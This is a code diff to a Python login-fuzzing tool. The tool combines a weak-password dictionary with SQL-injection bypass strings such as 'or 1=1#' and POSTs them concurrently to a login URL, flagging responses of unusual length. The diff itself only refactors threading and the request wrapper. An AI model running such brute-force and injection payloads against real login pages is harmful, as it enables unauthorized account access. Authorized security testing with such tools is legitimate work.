@@ -3,7 +3,6 @@
 #author:Jinhao
 
 import os
-import requests
 from concurrent.futures import ThreadPoolExecutor
 from reports import reports
 from bs4 import BeautifulSoup
@@ -14,11 +13,10 @@ sql_pass = ['\'or 1=1#', '"or 1=1#', '\')or 1=1#', 'or 1=1--', 'a\'or\'1=1--', '
 payload = weak_dict+sql_pass
 
 class Login:
-    def __init__(self,url,REQ,file,threads,name,flag):
+    def __init__(self,url,REQ,file,name,flag):
         self.url = url
         self.REQ = REQ
         self.file = file
-        self.threads = threads
         self.name = name
         self.flag = flag
 
@@ -135,7 +133,7 @@ class Login:
         :return:报告
         '''
         report = []
-        with ThreadPoolExecutor(max_workers=self.threads) as pool:
+        with ThreadPoolExecutor(max_workers=20) as pool:
             results = pool.map(self.fuzz,exp)
             for result in results:
                 # print(result['len'])
@@ -155,7 +153,7 @@ class Login:
             "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36"
         }
         try:
-            res = requests.post(self.url, data=data, headers=headers).content
+            res = self.REQ.autoPostAccess(self.url, data=data, headers=headers).content
             length = len(res)
             if length != self.len:
                 msg = {'flag':1,'msg':data,'len':length}
